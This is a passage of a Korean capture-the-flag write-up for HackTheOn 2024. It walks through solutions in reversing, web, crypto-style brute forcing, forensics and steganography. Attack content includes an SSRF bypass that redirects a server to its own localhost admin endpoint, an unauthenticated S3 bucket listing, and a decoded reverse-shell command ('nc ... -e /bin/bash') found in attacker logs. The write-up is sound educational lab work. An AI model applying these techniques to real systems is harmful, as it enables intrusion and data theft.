저희가 원하는 문구는 sending transaction 임으로, 6번을 대상으로 진행해봅니다.

![img](https://lh7-us.googleusercontent.com/slidesz/AGV_vUcG5j2Sm2qNxOcWE-X1uAImya1Ck5DVh2FamcQZagTwqFXodb7EgReX9JoEgjjTcc3o0qJpkIJbtOb3Ro0-E3GUQb_pwC8ZskeJdA7JgYJi2ywN-5Wf3Swn-09CTM6MVqLlKNSfndtCrYfbq10dHapJuD5LldA=s2048?key=iBB5N8FSRKchO_hzOd9DYw)

여기서 account not found가 나오는데, 6번이 sending transaction 이라 가정하면 account not found가 나오는것이 어느정도 말이 됩니다.



6번에 from to 와 같은 tx info를 담지 않았음으로 해당 값을 담아서 보내봅니다.

![img](https://lh7-us.googleusercontent.com/slidesz/AGV_vUfPm9ebC95gMeIrhCJK3WHbmcgjGYk-dg_QRPQXFP59q99egO-QgX6yXzWswkY9hGK7zHkcg05sUyM3LBkFBgtIiIn38a2-kEFsvzlwW2pFsslYSEIJpE2r4sSjv5ElQLr1yGpshTb5VoBAozw8V7BM9tDv518=s2048?key=iBB5N8FSRKchO_hzOd9DYw)

또 account not found가 나오게 됩니다.

여기서 이전 5번을 실행했을 때 `Valid account. Restore Complete` 가 나왔었는데, 이게 account load 혹은 restore 라면 6번 실행 이전에 넣어주면 잘 실행될거 같다는 생각을 하고 진행합니다.

![img](https://lh7-us.googleusercontent.com/slidesz/AGV_vUeh6auQl3MKFR8nPxPbVUA-0ft9qDbdU4-KOPBoRWY8dMioNLb9sMyuNE0Ua1ftJgcg9ql9usBFpER-nmWEqg6I75MriDl6RzGVOcMSWFsDyRXUHciFZr8QCeG8TklLxVeJ8vDfTeMlJhh-NHugljx9P3b29kf8=s2048?key=iBB5N8FSRKchO_hzOd9DYw)

원하는 문구인 `Sending transaction` 이 나오게 되었습니다!



이제 flag를 읽어주는 routine 이 있는 함수에 진입했음으로, ida를 통해 어떤 조건을 만족시켜야하는지 대략적으로 분석해야합니다.

![img](https://lh7-us.googleusercontent.com/slidesz/AGV_vUczJuYfWOf_mH4kb2Fo8hjtHBNjkUVokHOU0NReSkGyRt-HCTJZslahkaNQbPFrOtoTPQQkkNYTHLQVnWqtzaHDIsZuzSx19hozgy-QCp24RG0bV0yOIoOZPye-kQD7HyrHWqD35yioe8cU0Ygyg-QVtkqTq-0=s2048?key=iBB5N8FSRKchO_hzOd9DYw)

대략적으로 보면 0x5f5e0ff(=99,999,999) 랑 비교를 하는걸 볼 수 있습니다.

대략 잔액이 해당 값 이상이면 될거 같다 유추를 하고, 어떻게 조작을 할지 고민을 해봅니다.

tx 를 보낼 때 amount를 적어 보내는데, 이 amount를 음수로 넣게 되면 어떻게 처리할지 궁금하여 넣어보았습니다

(만약 잘못 처리되게 되면, 돈을 보냈는데 제 잔액이 늘어날 수 있음으로)



![img](https://lh7-us.googleusercontent.com/slidesz/AGV_vUeda8502AQ7cQcEzyI0hduG-VmYeFZvO_jJRHk9zIvPkxTKJPMM_fzvWHGw5eruNe8egxJk1HAJ2AQgq6C4Gij-JsEWAckKi-mj-_NJv-ZH8pJuN-RevgBmxMVfaFlGpgvp4JvFD4VdaO2kU86aYZ7KV7ycz_JC=s2048?key=iBB5N8FSRKchO_hzOd9DYw)

플래그를 얻게 되었습니다 :)


해당 문제를 통해서 reversing 문제의 직감적 접근의 흐름을 살펴보았습니다. 분석이 어렵거나 큰 바이너리의 경우 전부 분석해야하는 경우도 있지만, 이러한 방식으로 특정 부분의 간단한 분석과 상식적인 흐름으로 풀어낼 수 있는 경우도 있습니다.

## 5. Web - Revact

react native로 제작된 웹 사이트다. 브라우저 소스보기에서 Main.5e39c7c2.js를 분석해보면 비교 연산을 해주는 것을 확인할 수 있다. 해당 로직은 Input 받을 때 검증할 때 사용한다.
![](/assets/img/hacktheon2024/go4.png)
![](/assets/img/hacktheon2024/go5.png)

조건에 맞추어 파이썬 포팅하면 `XG@@DzX`가 나오고, 이를 입력해주면 flag를 획득할 수 있다.

```py
def find_valid_string():
    z_value = 'D'
    char_5 = z_value
    char_6 = chr(ord(char_5) + 54)
    char_2 = chr(ord(char_6) - 56 + 5)
    char_1 = 'X'
    char_3 = '@'
    char_4 = '@'
    char_7 = char_1
    e = char_1 + char_2 + char_3 + char_4 + char_5 + char_6 + char_7
    return e

e_string = find_valid_string()
print("Generated string:", e_string)
```

## 6. Web - GithubReadme

처음 웹사이트에 접속하면 git 레포지토리를 하나 입력받아 README.md의 내용을 가져오는 페이지가 주어진다.

주어진 소스코드 파일들을 참고하면 Django Ninja 라이브러리를 이용해 서비스를 구현한 것을 알 수 있다.

```python
@api.get("/admin", response={200: dict, 401: Error})
def admin(request):
    client_ip, is_routable = get_client_ip(request)
    if not is_routable:
        return {"msg": os.environ.get("FLAG")}
    else:
        return 401, {"msg": "ACCESS DENIED"}
```

플래그는 `/admin` 엔드포인트에서 환경 변수에 저장되어 있는 FLAG를 가져와 반환해준다. `/admin` 엔드포인트에 접근하기 위해서는 not is_routable, 즉 localhost로 요청을 보내야한다.


```python
@api.post("/view", response={200: str, 400: Error})
def view(request, path: Path):
    try:
        ip = get_client_ip(request)[0]
        if ReqLog.objects.filter(ip=ip, request_at__gt=timezone.now() - timedelta(seconds=10)).exists():
            return 400, {'msg': f"so Fast.. - {ip}"}
        else:
            ReqLog(ip=ip).save()
            github = Github.objects.filter(path=path)
            if github.exists():
                return github.first().readme
            url = (
                f"https://raw.githubusercontent.com{path.path}/{path.branch_name}/README.md"
            )
            URLValidator()(url)
            response = requests.get(url)
            if response.status_code != 200:
                return 400, {}
            readme = response.text
            Github(path=path, readme=readme).save()
            return readme
    except Exception as e:
        return 400, {"msg": e}
```

`api/api.py`의 `/view` 엔드포인트를 살펴보면 `path.path`, `path.branch_name`을 입력받아 python requests 패키지를 이용해 README.md의 내용을 가져온 후 DB에 저장한다.

`f"https://raw.githubusercontent.com/{path.path}/{path.branch_name}/README.md"`가 아닌 `f"https://raw.githubusercontent.com{path.path}/{path.branch_name}/README.md"` 로 받기 때문에 `raw.githubusercontent.com`으로 subdomain을 생성해 공격자의 웹사이트로 요청을 보낼 수 있다.

`raw.githubcontent.com.cykorfighting.kro.kr`, 팀 서버 IP로 A 레코드를 생성해 진행하였다. 처음에는 문제 풀이 서버에 CNAME을 걸어 바로 접근하려고 시도했으나, Django의 `manage.py runserver`가 https를 지원하지 않기 때문에 이 방식으로는 SSRF가 불가능하다.

이것을 우회하기 위해서는 서브 도메인으로 연결한 본인 웹사이트에 문제 풀어 서버의 `/admin` 엔드포인트로 redirection을 걸어주면 오류없이 정상적으로 우회가 가능하다. 

```
raw.githubusercontent.com.cykorfighting.kro.kr {
	redir "http://localhost:8044/api/admin"
}
```

redirection을 할 수 있는 여러가지 방법 중, Caddy Web Server을 이용하여 진행하였다.

최종적으로 path.path에 `raw.githubusercontent.com.cykorfighting.kro.kr`, path.branch_name에 `#`을 넣고 `/view` 엔드포인트에 요청을 보내면 플래그를 획득할 수 있다.

![](/assets/img/hacktheon2024/image4.png)

`J_DN5_S5L_CUST0M_JH`

## 7. Web - DogGallery

처음 주어진 웹사이트에서 AWS 버킷에서 이미지만 불러오고, API 서버와 통신하는 동작은 따로 존재하지 않는다.

하지만, 문제 태그가 `Trend`이기에 Cloud와 연관이 있다는 것을 유추할 수 있다.

AWS에서는 Bucket S3이라는 서비스를 통해 Static 파일들을 제공하는데, 권한 설정 오류로 인한 버킷 내부 파일 노출이 가능하다.

![](/assets/img/hacktheon2024/image1.png)

이 문제에서 사용하는 htodogpics 버킷의 경우, 사용자 인증 절차를 따로 거치지 않아도 접근이 되는 취약점이 있어 awscli의 `aws s3 ls s3://htodigpics --no-sign-request` 명령어를 통해 플래그 텍스트 파일이 존재하는 것을 알 수 있다.

![](/assets/img/hacktheon2024/image2.png)

이후, 찾아낸 텍스트 파일에 접근하여 플래그를 획득할 수 있다.

FLAG: `IMPORTANT_S3_P0L1CY_ByJ`

## 8. Reversing - Decrypt Message 1

문제는 바이너리 없이 소스코드만 주어졌습니다.

main은 암호화된 결과를 순서대로 앞에서부터 hex로 출력해주는 역할만을 합니다.
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

unsigned long* encryption(unsigned long data[], unsigned long size)
{
    unsigned int eax;
    unsigned int edx;
    unsigned int ecx;
    unsigned int byte_address;

    for (byte_address = 0; byte_address < size; byte_address++)
    {
        eax = data[byte_address];
        ecx = eax + 0x11;
        eax = eax + 0xB;
        ecx = eax * ecx;
        edx = ecx;
        edx = edx >> 8;
        eax = edx;
        eax = eax ^ ecx;
        eax = eax >> 0x10;
        eax = eax ^ edx;
        eax = eax ^ ecx;
        data[byte_address] = eax;
    }
    return data;
}

unsigned long* _encryption(void* data, unsigned long size)
{
    unsigned long* data_chunk = NULL;
    unsigned long* result;
    int i;

    if (size & 1) size++;
    data_chunk = (unsigned long*)malloc(size * sizeof(unsigned long));
    if (!data_chunk) return NULL;
    memset(data_chunk, 0, size * sizeof(unsigned long)); // Ensure memory is initialized to zero
    for (i = 0; i < size / 2; i++) data_chunk[i] = ((unsigned short*)data)[i];

    result = encryption(data_chunk, size / 2); // Adjusted the size passed to encryption
    return result;
}

int main(int argc, char *argv[])
{
    if (argc < 2) {
        printf("Usage: %s <text to encrypt>\n", argv[0]);
        return 1; // Exit if no argument is provided
    }

    const char* input = argv[1];
    unsigned long size = strlen(input); // Use the length of the input argument
    // Ensure the input is treated correctly based on how _encryption function is expected to work
    unsigned long* encrypted_data = _encryption((void*)input, size);

    // Print each encrypted unsigned long in hexadecimal format
    printf("Encrypted data in hexadecimal format: ");
    for (unsigned long i = 0; i < (size + 1) / 2; i++) { // Adjusted loop condition based on encryption function logic
        printf("%lx", encrypted_data[i]);
    }
    printf("\n");

    free(encrypted_data); // Remember to free the allocated memory

    return 0;
}

```

_encryption은 입력을 2바이트씩 잘라서 4바이트 크기의 data_chunk 배열에 저장합니다.

그리고 이를 encryption에서 호출합니다.

즉 main 로직은 encryption 함수입니다.

```c
unsigned long* encryption(unsigned long data[], unsigned long size)
{
    unsigned int eax;
    unsigned int edx;
    unsigned int ecx;
    unsigned int byte_address;

    for (byte_address = 0; byte_address < size; byte_address++)
    {
        eax = data[byte_address];
        ecx = eax + 0x11;
        eax = eax + 0xB;
        ecx = eax * ecx;
        edx = ecx;
        edx = edx >> 8;
        eax = edx;
        eax = eax ^ ecx;
        eax = eax >> 0x10;
        eax = eax ^ edx;
        eax = eax ^ ecx;
        data[byte_address] = eax;
    }
    return data;
}

```

encryption 함수에서는 2바이트씩 암호화를 진행합니다.이때 data 배열은 4바이트이기에  최종적으로 2바이트=>4바이트로 암호화가 진행됩니다. 이는 간단하게 brute-force로 해결할 수 있습니다.


```python
import string
import itertools
enc="188d1f2f13cd5b601bd6047f4496ff74496ff74496ff70"
enc=[0x188d1f2f,0x13cd5b60,0x1bd6047f,0x4496ff7,0x4496ff7,0x4496ff7]
flag=""
able=list(map(ord,string.printable))
for i in range(len(enc)):
	for perm in itertools.product(able, repeat=2):
		m=(perm[1]<<8)+perm[0]
		eax = m
		ecx = eax + 0x11;
		eax = eax + 0xB;
		ecx = eax * ecx;
		edx = ecx;
		edx = edx >> 8;
		eax = edx;
		eax = eax ^ ecx;
		eax = eax >> 0x10
		eax = eax ^ edx;
		eax = eax ^ ecx;
		if eax==enc[i]:
			flag+=chr(perm[0])
			flag+=chr(perm[1])
print(flag)
```

위 코드로 플래그를 얻을 수 있습니다. 이때 문제 코드에서는 최종 암호화된 결과가 hex값으로 출력되는데 그 범위가 정확히 4바이트로 출력되지는 않아서 임의로 4바이트,3.5바이트씩 잘라서 결과가 출력되는 값을 얻어내야 했습니다.

flag : ```GODGPT!!!!!!```

## 9. Reversing - Decrypt Message 2

IDA로 main을 열어보면 `srand(time(NULL))`을 사용하면서 프로그램 내에서 랜덤 값을 사용하는 것을 볼 수 있습니다. 즉, 이 프로그램은 실행할 때마다 바뀌는 프로그램이 될 것입니다.

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  unsigned int v3; // eax
  char *ptr; // [rsp+8h] [rbp-18h]

  v3 = time(0LL);
  srand(v3);
  ptr = sub_16A0(off_4010, 5LL);
  printf("encryptedFlag @ %s\n", ptr);
  free(ptr);
  return 0LL;
}
```

그 후 off_4010과 5를 인자로 sub_16A0의 로직을 실행 한 후 encrypted Flag를 출력해줍니다.

![](/assets/img/hacktheon2024/off4010.png)

4010에는 ```THIS_IS_FAKE_FLAG!!!``` 라는 fake flag가 들어있습니다.

```c
const char *__fastcall sub_16A0(const char *a1, unsigned int a2)
{
  __int64 v3; // [rsp+10h] [rbp-40h]
  void *v4; // [rsp+18h] [rbp-38h]
  void *ptr; // [rsp+20h] [rbp-30h]
  char *v6; // [rsp+28h] [rbp-28h]
  unsigned int v7; // [rsp+30h] [rbp-20h]

  v7 = strlen(a1);
  if ( v7 % a2 )
    return "";
  v6 = sub_1530(a2);
  printf("key @ %s\n", v6);
  ptr = sub_1600(a1, v7);
  v4 = sub_1600(v6, a2);
  sub_1270(ptr, v4, v7, a2);
  sub_1310(ptr, v4, v7, a2);
  v3 = sub_11C0(ptr, v7);
  free(ptr);
  free(v4);
  free(v6);
  return v3;
}
```

16A0은 전반적인 암호화에 해당하는 함수입니다. 

앞에서 가져온 fake flag의 길이가 5로 나누어 떨어지지 않는다면 바로 프로그램을 종료시킵니다.

즉 fake flag는 5의 배수여야합니다. 그 후 sub_1530,sub_1600,sub_1270,sub_1310,sub_11c0등 함수들을 반복합니다.

```c
_BYTE *__fastcall sub_1530(int a1)
{
  int i; // [rsp+14h] [rbp-2Ch]
  _BYTE *v3; // [rsp+18h] [rbp-28h]
  int v4; // [rsp+24h] [rbp-1Ch]

  v4 = strlen("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789");
  v3 = malloc(a1 + 1);
  for ( i = 0; i < a1; ++i )
    v3[i] = aAbcdefghijklmn[rand() % v4];
  v3[a1] = 0;
  return v3;
}

```

sub_1530 함수는 `A~Z,a~z,0~9`의 범위내에서 5개의 문자를  시간 기반의 랜덤으로 추출하여 반환해줍니다.

```c
  printf("key @ %s\n", v6);
```

그리고 해당 함수 아래에서 key를 출력해주므로 위에서 추출한 5개의 문자를 암호화에서 key로 사용한다는 것을 알 수 있습니다. 

```c
_DWORD *__fastcall sub_1600(__int64 a1, int a2)
{
  int i; // [rsp+Ch] [rbp-24h]
  _DWORD *v4; // [rsp+10h] [rbp-20h]

  v4 = malloc(4LL * a2);
  for ( i = 0; i < a2; ++i )
    v4[i] = *(a1 + i);
  return v4;
}
```

sub_1600은 값을 옮기는 부분입니다.

```c
unsigned __int64 __fastcall sub_1270(__int64 a1, __int64 a2, int a3, int a4)
{
  int i; // [rsp+Ch] [rbp-24h]

  for ( i = 0; i < a3; ++i )
    *(a1 + 4LL * i) ^= *(a2 + 4LL * (i % a4));
  return __readfsqword(0x28u);
}
```

sub_1270은 xor연산을 진행하는 부분입니다.  fake flag와 위에서 추출한 5개의 문자를 xor합니다. 이때 5개의 문자는 fake flag 길이만큼 반복 xor 연산됩니다.

```c
unsigned __int64 __fastcall sub_1310(__int64 a1, __int64 a2, int a3, int a4)
{
  int ii; // [rsp+4h] [rbp-4Ch]
  int n; // [rsp+8h] [rbp-48h]
  int m; // [rsp+Ch] [rbp-44h]
  _DWORD *ptr; // [rsp+10h] [rbp-40h]
  int v9; // [rsp+18h] [rbp-38h]
  int v10; // [rsp+18h] [rbp-38h]
  int k; // [rsp+1Ch] [rbp-34h]
  int j; // [rsp+20h] [rbp-30h]
  int i; // [rsp+24h] [rbp-2Ch]
  _DWORD *v14; // [rsp+28h] [rbp-28h]

  v14 = malloc(4LL * a4);
  for ( i = 0; i < a4; ++i )
    v14[i] = i;
  for ( j = 0; j < a4; ++j )
  {
    for ( k = j + 1; k < a4; ++k )
    {
      if ( *(a2 + 4LL * j) > *(a2 + 4LL * k) )
      {
        v9 = *(a2 + 4LL * j);
        *(a2 + 4LL * j) = *(a2 + 4LL * k);
        *(a2 + 4LL * k) = v9;
        v10 = v14[j];
        v14[j] = v14[k];
        v14[k] = v10;
      }
    }
  }
  ptr = malloc(4LL * a3);
  for ( m = 0; m < a3; m += a4 )
  {
    for ( n = 0; n < a4; ++n )
      ptr[n + m] = *(a1 + 4LL * (v14[n] + m));
  }
  for ( ii = 0; ii < a3; ++ii )
    *(a1 + 4LL * ii) = ptr[ii];
  free(ptr);
  free(v14);
  return __readfsqword(0x28u);
}
```

sub_1310은 5개의 문자열에 대해서  bubble sort를 진행하고 뒤바뀐 index를 v14에 기록해 놓습니다.

그리고 이를 이용해 sub_1270에서 xor을 진행한 결과 인덱스 연산해줍니다.

```c
char *__fastcall sub_11C0(__int64 a1, int a2)
{
  int i; // [rsp+Ch] [rbp-24h]
  char *v4; // [rsp+10h] [rbp-20h]

  v4 = malloc(2 * a2 + 1);
  for ( i = 0; i < a2; ++i )
    sprintf(&v4[2 * i], "%02x", *(a1 + 4LL * i));
  return v4;
}
```

sub_11c0은 최종적으로 암호화된 결과를 hex값으로 출력해주는 부분입니다.

이렇게 분석된 코드들을 파이썬으로 porting하여 하나의 코드로 나타내보겠습니다.

```python
# analysis.py
from ctypes import *
libc = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
libc.srand(libc.time(0))

table=b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
key=[0]*5
for i in range(5):
	key[i]=table[libc.rand()%len(table)]
print("key @ ","".join([chr(i)for i in key]))
fake_flag=b"THIS_IS_FAKE_FLAG!!!"
out=[]
for i in range(len(fake_flag)):
        out.append((key[i%len(key)]^fake_flag[i]))

def swap(a1, a2, a3, a4):
    v14 = list(range(5))
    for j in range(5):
        for k in range(j + 1, 5):
            if a2[j] > a2[k]:
                a2[j], a2[k] = a2[k], a2[j]
                v14[j], v14[k] = v14[k], v14[j]
    ptr = []
    for m in range(0, 20, 5):
        ptr.extend(a1[(v14[n] + m)] for n in range(5))
    for ii in range(20):
        a1[ii] = ptr[ii]
    return a1


swapped=swap(out,list(key),20,5)
print("encryptedFlag @ ",bytes(swapped).hex())
```

![](/assets/img/hacktheon2024/ported.png)

time seed가 동일할 때 같은 암호화결과가 나옵니다.

이제 로직을 올바르게 구현했으니 fake flag가 아닌 온전한 flag를 얻어야 합니다.

문제 description에서 제시하고 있는 암호화 결과는 `446709213550020f3b28696533183206631e030743394d4531` 입니다. 이때 real flag의 첫 5자리는 ```BrU7e```로 주어졌습니다.

이 5자리의 real flag는 key와 xor되므로 이를 바탕으로 코드를 작성해보겠습니다.

```python
pull=list(b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789")
key=b"BrU7e"
out=bytes.fromhex("4467092135")
able=[]
for i in range(len(key)):
    for j in range(len(out)):
        target=key[i]^out[j]
        if target in pull:
            able.append(target)
able="".join([chr(i)for i in able])
print(able) 
```

플래그의 첫 5자리와 암호화된 결과를 xor 해서 key가 될 수 있는 후보들을 찾아줍니다.(Kcw6SG2tsPlDP)

```python
import itertools

def swap(a1, a2, a3, a4):
    v14 = list(range(5))
    for j in range(5):
        for k in range(j + 1, 5):
            if a2[j] > a2[k]:
                a2[j], a2[k] = a2[k], a2[j]
                v14[j], v14[k] = v14[k], v14[j]

    ptr = []
    for m in range(0, 20, 5):
        ptr.extend(a1[(v14[n] + m)] for n in range(5))

    for ii in range(20):
        a1[ii] = ptr[ii]
    return a1,v14

able="Kcw6SG2tsPlDP"
orig=b"BrU7eIS_FAKE_FLAG!!!"
enc=bytes.fromhex("446709213550020f3b28696533183206631e030743394d4531")

for perm in itertools.product(able, repeat=5):
    out=[]
    orig=b"BrU7eIS_FAKE_FLAG!!!"
    key="".join(perm)
    for i in range(len(orig)):
        out.append((ord(key[i%len(key)])^orig[i]))
    swapped,idx=swap(out,list(key),20,5)
    out=bytes(swapped)
    if out[:5]==enc[:5]:
        print("key:"+key)
        print(idx)
        break
```

이렇게 나온 key 후보들을 5자리의 무작위 배열로 암호화를 진행하여 나온 결과를 enc와 5자리까지만 비교했을 때 일치하는 값들을 골라보았습니다.

![](/assets/img/hacktheon2024/key_idx.png)



```w6tPl```가  key가 됩니다. 또한 bubble sort의 결과는```[1,3,4,2,0]``` 입니다. 

이 정보들로 역연산을 진행해주면 플래그를 얻어낼 수 있습니다.

```python
key=b"w6tPl"
enc=bytes.fromhex("446709213550020f3b28696533183206631e030743394d4531")

idx=[1, 3, 4, 2, 0]
out=[0]*len(enc)
count=0
for m in range(0,len(enc),5):
    for i in range(len(idx)):
        out[m+idx[i]]=enc[count]
        count+=1
flag=[]
for i in range(len(out)):
    flag.append(key[i%len(key)]^out[i])
print(bytes(flag))
```

key: `BrU7e_fORcE_l5_p0w3rFu1i!`

## 10. Forensic - PNG

sky.png 파일이 주어집니다. 파일이 깨져서 열리지 않습니다.

![](/assets/img/hacktheon2024/2.png)

Hex Viewer로 열게 되면 PNG 파일 시그니처가 없는 것을 확인할 수 있습니다.
![](/assets/img/hacktheon2024/3.png)

다른 정상 PNG 파일에서 없어진 헤더 부분을 가져다 복구하면 플래그를 확인할 수 있습니다.

![](/assets/img/hacktheon2024/4.png)

## 11. Forensic - Rumor1

Rumor 문제는 5개의 파트로 구성된 문제입니다. 첫번째 파트는 Mail 서버의 IP 주소를 찾는 문제로, evtx_dump를 이용해 xml로 추출하여 분석하였습니다.

![](/assets/img/hacktheon2024/image5.png)

mail 키워드를 검색하면 `mail.mnd.go.kr`, 즉 IP는 `92.68.200.206`인 것을 알 수 있다.

## 12. Forensic - Rumor2


두번째 파트는 공격자가 세션 연결을 위해 실행한 악성 프로세스의 PID를 구하는 문제입니다.

세션 연결을 위해서는 netcat, bash -i, python 등 여러 가지 방법으로 리버스 쉘을 열 수 있다.

![](/assets/img/hacktheon2024/image6.png)

이 문제에서는 `nc64.exe`를 사용해 리버스 쉘을 생성함을 확인할 수 있습니다.

`nc64.exe`의 PID는 `3868`이다.

## 13. Forensic - Rumor3


세번째 파트는 공격자가 추가적인 공격을 위해 스캔한 네트워크 대역를 찾는 문제이다.

네트워크 스캔은 일반적으로 python 스크립트, nmap, ping 등을 사용한다.

![](/assets/img/hacktheon2024/image7.png)

이 문제에서는 `python netscan.py`를 이용해 `192.168.100.x`를 스캔하는 것을 알 수 있다. 이것을 CIDR 영역으로 나타내면 `192.168.100.0/24`이다.


## 14. Forensic - Rumor4

Attacker 페이로드 분석하던중 `bmMgMTkyLjE2OC4xMDAuMzIgNTQ1NCAtZSAvYmluL2Jhc2g=====`가 존재했다. 이를 base64 복호화 해보니 `nc 192.168.100.32 5454 -e /bin/bash` 형태가 존재했고 이것이 정답이다.

![](/assets/img/hacktheon2024/go2.png)

## 15. Forensic - Rumor5

해당 문제는 최종적으로 탈취한 파일을 묻는 문제였다. 이벤트로그 중 curl을 통해서 read_file 요청을 보내는데 이 때 파일 이름이 `secret.tar.gz` 였다. 이것이 정답이다.
![](/assets/img/hacktheon2024/go1.png)

## 16. Forensic - Tracker1

Tracker 문제는 총 3단계로 이루어진 문제이다.

문제는 단계별로 이어지며, 하나의 단계를 건너뛰고 풀 수 없도록 구성되었다.

첫 번째 문제는 SNS에서 Drug 판매자의 `SNS ID`를 얻어오는 문제이다.

두 번째 문제는 Cryptocurrency 지갑으로부터 판매자의 `ETH Address`를 찾는 문제이다.

세 번째 문제는 판매자의 지갑으로 보낸 `Transaction ID`를 찾는 문제이다.

포렌식을 하기 위해서는 사용자의 `AppData` 폴더나 `Download`, `Desktop`, `Documents` 폴더를 유심히 봐야한다.

해당 문제는 Drug를 구매할 때 사용한 SNS에서, **Drug 판매자의 ID를 찾는 문제**이다.

통상 **Drug**를 구매한다고 생각하면, 개인정보 보호에 특화된 **SNS**를 사용하고, 잘 알려진 개인정보 보호 특화 **SNS**에는 **Telegram**, **Signal**이 있다.

 

![Tracker.ad1 - [root]→Users→User→AppData→Local→Programs→Session](/assets/img/hacktheon2024/Untitled.png)

Tracker.ad1 - [root]→Users→User→AppData→Local→Programs→Session

사용자의 `AppData` 폴더에서 Session이라는 SNS를 찾았고, 해당 SNS는 Signal 기반으로 개발되었음을 포럼에서 찾아볼 수 있었다.

![Trakcer.ad1 - [root]→Users→User→AppData→Roaming→Session](/assets/img/hacktheon2024/Untitled%201.png)

Trakcer.ad1 - [root]→Users→User→AppData→Roaming→Session

`AppData\Roaming` 폴더에는 대체로 **소프트웨어의 사용자 설정 파일, 데이터베이스 등이 포함**되어있다. Session SNS 또한 데이터베이스를 찾아볼 수 있었지만, **암호화** 되어있어 파일을 열어볼 순 없었다.

![Trakcer.ad1 - [root]→Users→User→AppData→Roaming→Session→config.json](/assets/img/hacktheon2024/Untitled%202.png)

Trakcer.ad1 - [root]→Users→User→AppData→Roaming→Session→config.json

키 값이 있지만 시간상 어떤 알고리즘을 이용하여 암호화 하는지 찾아보기 어려우므로 `config.json` 파일과 데이터베이스 파일인 `db.sqlite` 파일을 가상 환경에 복사하여 Session SNS를 마치 **타겟의 정보로 로그인된 것 처럼 동작**하도록 만들었다.

![Session SNS에 로그인 된 모습](/assets/img/hacktheon2024/Untitled%203.png)

Session SNS에 로그인 된 모습

![Session SNS → Drug 판매자의 이름은 David이고, 클릭해서 ID를 확인할 수 있다.](/assets/img/hacktheon2024/Untitled%204.png)

Session SNS → Drug 판매자의 이름은 David이고, 클릭해서 ID를 확인할 수 있다.

Drug 판매자의 ID는 `05aa64c6099f0e23345c279882edd6f73f4d20f5cc7aae2eef4874784ab4a50c77` 이다.

## 17. Forensic - Tracker2

해당 문제는 Drug 판매자의 ETH 주소를 찾는 문제이다.

이전 문제에서 사용되었던 Session SNS에서 ETH 주소를 찾아보려고 하였지만,  ETH 주소에 관하여 나눈 대화를 찾을 수 없었다.

![Untitled](/assets/img/hacktheon2024/Untitled%205.png)

따라서 포렌식 이미지 파일에서 가상화폐 관련 소프트웨어가 있을것이라고 판단하였다.

 

![Tracker.ad1 - [root]→Users→User→AppData→Local→Google→Chrome→User Data→Default→Extensions→nkbihfbeogaeaoehlefnkodbefgpgknn](/assets/img/hacktheon2024/Untitled%206.png)

Tracker.ad1 - [root]→Users→User→AppData→Local→Google→Chrome→User Data→Default→Extensions→nkbihfbeogaeaoehlefnkodbefgpgknn

따라서 Google Chrome의 검색 기록을 살펴보며 단서를 찾고 있던 도중, 확장 소프트웨어에서 `nkbihfbeogaeaoehlefnkodbefgpgknn` ID를 가진 확장을 찾을 수 있었고, 해당 확장은 암호화폐 지갑인 MetaMask임을 알 수 있었다.

![Untitled](/assets/img/hacktheon2024/Untitled%207.png)

![chrome-extension_nkbihfbeogaeaoehlefnkodbefgpgknn_0.indexeddb.leveldb→000004.log](/assets/img/hacktheon2024/Untitled%208.png)

chrome-extension_nkbihfbeogaeaoehlefnkodbefgpgknn_0.indexeddb.leveldb→000004.log

MetaMask의 로그를 보면 ETH 주소를 찾을 수 있다. 하지만 FLAG 체크 시 해당 주소는 판매자의 ETH 주소가 아니였다.

![Untitled](/assets/img/hacktheon2024/Untitled%209.png)

![Untitled](/assets/img/hacktheon2024/Untitled%2010.png)

**etherscan.io**에서 자금 흐름을 추적한 결과 최종 목적지 주소는`0xfC80B72Fcc371fFD9E1a2c33D4d7c6C00d0658D2` 임을 알 수 있었고, 해당 주소가 판매자의 ETH 주소였다.

## 18. Forensic - Tracker3

해당 문제는 판매자에게 송금한 ETH 트랜젝션 ID를 찾는 문제이다. 이전 문제에서 자금 흐름을 추적하였기 때문에, 트랜젝션 ID는 쉽게 찾을 수 있었다.

![Untitled](/assets/img/hacktheon2024/Untitled%2011.png)

타겟(자신)의 ETH 주소는 `0x45912905E6E79Ea74E3d5Ba0bA806e412712f94C` 이고, 외부로 나가는 송금의 트랜젝션 ID는 `0x2485878be80df93501b8a7caa7e70b616f4c5908f1599f6f0b869ed2fbc354a4` 이다.

## 19. Misc - MS office

![](/assets/img/hacktheon2024/preview.png)

주어진 문제의 압축을 풀게 되면 MS.xlsx 파일이 있습니다.

![](/assets/img/hacktheon2024/zip.png)


xlsx 파일은 zip 파일로 바꿀 수 있으므로 바꾸어주면 위처럼 여러 파일들이 나옵니다.

![](/assets/img/hacktheon2024/thumb.png)

이 중 문서의 메타데이터 파일, 썸네일 이미지등을 포함하는 docProps 폴더를 열어보면 thumbnail.jpeg가 들어있고 이를 열어보면 조그맣게 key가 보입니다.

![](/assets/img/hacktheon2024/thumbnail.png)

key:```th1S_1s_OOXML```


## 20. Misc - Confidential

## 21. Misc - stegoART

문제에서 present.png 파일이 주어집니다.

zsteg라는 스테가노그래피 툴을 사용하면 png 파일에 들어있는 여러 알려진 형식의 데이터를 탐지하고 추출할 수 있습니다.

![](/assets/img/hacktheon2024/5.png)

b1,g,lsb,xy에 (x,y) 형태의 데이터 리스트가 들어있으며, -E 옵션으로 모든 데이터를 추출했습니다

![](/assets/img/hacktheon2024/6.png)

목록에 들어있는 좌표를 칠하고 이미지를 보면 플래그를 얻을 수 있습니다.

```python
from PIL import Image

img = Image.new("RGB", (600, 80), (255, 255, 255))

d = [(8,5), (8,6), ...]

for y, x in d:
    img.putpixel((x, y), (0, 0, 0))

img.show()
```

![](/assets/img/hacktheon2024/7.png)